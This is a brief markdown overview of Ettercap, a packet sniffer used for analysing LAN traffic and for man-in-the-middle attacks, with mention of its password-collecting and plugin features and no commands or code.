# Ettercap
## Overview
Ettercap is one of packet analyzers such as wireshark, tcpdump. It is also called as a packet sniffer because it is capable of intercepting data streams which flow on computer networks, and these captured packets are decoded and analyzed through proper RFCs or protocols by the tool. Therefore, it can be used as a tool for man-in-the-middle (MITM) attacks on local area network (LAN). By default, it has the ability to filter packets, collect passwords, and conduct eavesdropping. Moreover, its features can be extended by custom plugins using its API as it has plugin suppport.
